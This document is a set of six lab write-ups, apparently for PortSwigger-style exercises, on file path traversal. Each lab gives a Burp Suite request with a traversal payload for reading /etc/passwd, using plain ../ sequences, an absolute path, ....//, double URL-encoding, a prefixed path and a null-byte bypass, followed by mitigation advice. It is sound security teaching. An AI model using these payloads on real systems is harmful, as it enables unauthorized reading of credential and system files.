**Lab 1: File path traversal, simple case**
1. Intercepting the Request

Open Burp Suite and ensure the proxy is enabled.

Navigate to the vulnerable web application and access the product image page.

In Burp Suite, go to the "Proxy" > "Intercept" tab.

Click on an image to trigger a request and capture it using Burp.

![Screenshot from 2025-01-08 12-48-24](https://github.com/user-attachments/assets/bf47e6d3-d3a9-419d-8e0b-47eb69fee64d)


2. Modifying the Request

Identify the filename parameter in the request.

Modify its value to perform directory traversal by entering:

../../../etc/passwd
![Screenshot from 2025-01-08 11-12-56](https://github.com/user-attachments/assets/9accd125-883c-4937-be7b-db4fe9828195)

Forward the modified request to the server.

3. Observing the Response

Switch to the "HTTP history" tab in Burp Suite.

Review the server response.

If successful, the contents of the /etc/passwd file will be displayed in the response body, such as:

![Screenshot from 2025-01-08 12-48-05](https://github.com/user-attachments/assets/1d2c547d-1ed6-4d3e-9ef4-b3fd27646f78)

Explanation

The vulnerability arises due to insufficient input validation, allowing attackers to manipulate the filename parameter to access files outside the intended directory.

Impact

Unauthorized access to sensitive system files (e.g., /etc/passwd, configuration files).

Potential exposure of credentials, user data, or internal information.

Mitigation Strategies

To prevent path traversal vulnerabilities, developers should:

Implement input validation to restrict file paths.

Use allowlists to permit only valid filenames.

Employ secure coding practices like basename() function to sanitize inputs.

Set proper server permissions to limit access to sensitive files.

Conclusion

This lab demonstrates how improper validation of user-supplied input in file retrieval functions can lead to unauthorized access to critical files on the server. Proper mitigation techniques should be implemented to prevent such attacks.

**Lab 2: File path traversal, traversal sequences blocked with absolute path bypass**

1. Intercepting the Request

Open Burp Suite and ensure the proxy is enabled.

Navigate to the vulnerable web application and access the product image page.

In Burp Suite, go to the "Proxy" > "Intercept" tab.

Click on an image to trigger a request and capture it using Burp.

Example Intercepted Request:

GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...

2. Modifying the Request

Identify the filename parameter in the request.

Modify its value to perform directory traversal by entering:

/etc/passwd

Forward the modified request to the server.

Modified Request:

GET /image?filename=/etc/passwd HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...
![Screenshot from 2025-01-08 12-48-05](https://github.com/user-attachments/assets/fd40d7d4-30ce-4f77-9a71-6f9477920a21)

3. Observing the Response

Switch to the "HTTP history" tab in Burp Suite.

Review the server response.

Explanation

The vulnerability arises due to insufficient input validation, allowing attackers to manipulate the filename parameter to access files outside the intended directory.

Impact

Unauthorized access to sensitive system files (e.g., /etc/passwd, configuration files).

Potential exposure of credentials, user data, or internal information.

Mitigation Strategies

To prevent path traversal vulnerabilities, developers should:

Implement input validation to restrict file paths.

Use allowlists to permit only valid filenames.

Employ secure coding practices like basename() function to sanitize inputs.

Set proper server permissions to limit access to sensitive files.

Conclusion

This lab demonstrates how improper validation of user-supplied input in file retrieval functions can lead to unauthorized access to critical files on the server. Proper mitigation techniques should be implemented to prevent such attacks.

**Lab 3: File path traversal, traversal sequences stripped non-recursively**

1. Intercepting the Request

Open Burp Suite and ensure the proxy is enabled.

Navigate to the vulnerable web application and access the product image page.

In Burp Suite, go to the "Proxy" > "Intercept" tab.

Click on an image to trigger a request and capture it using Burp.

Example Intercepted Request:

GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...

2. Modifying the Request

Identify the filename parameter in the request.

Modify its value to perform directory traversal by entering:

**....//....//....//etc/passwd**

Forward the modified request to the server.

Modified Request:

GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...

3. Observing the Response

Switch to the "HTTP history" tab in Burp Suite.

Review the server response.

If successful, the contents of the /etc/passwd file will be displayed in the response body, such as:

![Screenshot from 2025-01-08 13-05-15](https://github.com/user-attachments/assets/9eb73a71-d90a-4191-8ccf-22a0be8376c9)


Explanation

The vulnerability arises due to insufficient input validation, allowing attackers to manipulate the filename parameter to access files outside the intended directory.

Impact

Unauthorized access to sensitive system files (e.g., /etc/passwd, configuration files).

Potential exposure of credentials, user data, or internal information.

**Lab 4: File path traversal, traversal sequences stripped with superfluous URL-decode**

Steps to Exploit Path Traversal

1. Intercepting the Request

Open Burp Suite and ensure the proxy is enabled.

Navigate to the vulnerable web application and access the product image page.

In Burp Suite, go to the "Proxy" > "Intercept" tab.

Click on an image to trigger a request and capture it using Burp.

Example Intercepted Request:

GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...

2. Modifying the Request

Identify the filename parameter in the request.

Modify its value to perform directory traversal by entering:

**..%252f..%252f..%252fetc/passwd**

Forward the modified request to the server.

Modified Request:

GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...

3. Observing the Response

Switch to the "HTTP history" tab in Burp Suite.

Review the server response.

If successful, the contents of the /etc/passwd file will be displayed in the response body, such as:

![Screenshot from 2025-01-08 13-32-43](https://github.com/user-attachments/assets/947a1e4c-2add-4dcc-96cb-75e9e3f15f05)

Explanation

The vulnerability arises due to insufficient input validation, allowing attackers to manipulate the filename parameter to access files outside the intended directory.
![Screenshot from 2025-01-08 13-34-26](https://github.com/user-attachments/assets/3b8a71b8-0a15-4bf1-9ef1-84733a342710)

Impact

Unauthorized access to sensitive system files (e.g., /etc/passwd, configuration files).

Potential exposure of credentials, user data, or internal information.

**Lab 5: File path traversal, validation of start of path**

Steps to Exploit Path Traversal

1. Intercepting the Request

Open Burp Suite and ensure the proxy is enabled.

Navigate to the vulnerable web application and access the product image page.

In Burp Suite, go to the "Proxy" > "Intercept" tab.

Click on an image to trigger a request and capture it using Burp.

Example Intercepted Request:

GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...

2. Modifying the Request

Identify the filename parameter in the request.

Modify its value to perform directory traversal by entering:

/var/www/images/../../../etc/passwd

Forward the modified request to the server.

Modified Request:

GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...

3. Observing the Response

Switch to the "HTTP history" tab in Burp Suite.

Review the server response.

If successful, the contents of the /etc/passwd file will be displayed in the response body, such as:

![Screenshot from 2025-01-08 13-38-48](https://github.com/user-attachments/assets/64380bf0-a9f9-4038-8963-e54398107d0d)

![Screenshot from 2025-01-08 13-39-20](https://github.com/user-attachments/assets/66adf682-5399-4d37-88c9-06b94ae6315d)

Explanation

The vulnerability arises due to insufficient input validation, allowing attackers to manipulate the filename parameter to access files outside the intended directory.

Impact

Unauthorized access to sensitive system files (e.g., /etc/passwd, configuration files).

Potential exposure of credentials, user data, or internal information.

Mitigation Strategies

To prevent path traversal vulnerabilities, developers should:

Implement input validation to restrict file paths.

Use allowlists to permit only valid filenames.

Employ secure coding practices like basename() function to sanitize inputs.

Set proper server permissions to limit access to sensitive files.

Conclusion

This lab demonstrates how improper validation of user-supplied input in file retrieval functions can lead to unauthorized access to critical files on the server. Proper mitigation techniques should be implemented to prevent such attacks.

**Lab 6: File path traversal, validation of file extension with null byte bypass**

Steps to Exploit Path Traversal

1. Intercepting the Request

Open Burp Suite and ensure the proxy is enabled.

Navigate to the vulnerable web application and access the product image page.

In Burp Suite, go to the "Proxy" > "Intercept" tab.

Click on an image to trigger a request and capture it using Burp.

Example Intercepted Request:

GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...

2. Modifying the Request

Identify the filename parameter in the request.

Modify its value to perform directory traversal by entering:

../../../etc/passwd%00.png

Forward the modified request to the server.

Modified Request:

GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
...

3. Observing the Response

Switch to the "HTTP history" tab in Burp Suite.

Review the server response.

If successful, the contents of the /etc/passwd file will be displayed in the response body, such as:

![Screenshot from 2025-01-08 13-47-12](https://github.com/user-attachments/assets/546260d7-2f4f-4269-9c26-b229cfd17bd7)

![Screenshot from 2025-01-08 13-47-20](https://github.com/user-attachments/assets/6c49acde-be8e-40e0-b5fe-6caf7afd1921)

Explanation

The vulnerability arises due to insufficient input validation, allowing attackers to manipulate the filename parameter to access files outside the intended directory.

Impact

Unauthorized access to sensitive system files (e.g., /etc/passwd, configuration files).

Potential exposure of credentials, user data, or internal information.

Mitigation Strategies

To prevent path traversal vulnerabilities, developers should:

Implement input validation to restrict file paths.

Use allowlists to permit only valid filenames.

Employ secure coding practices like basename() function to sanitize inputs.

Set proper server permissions to limit access to sensitive files.

Conclusion

This lab demonstrates how improper validation of user-supplied input in file retrieval functions can lead to unauthorized access to critical files on the server. Proper mitigation techniques should be implemented to prevent such attacks.
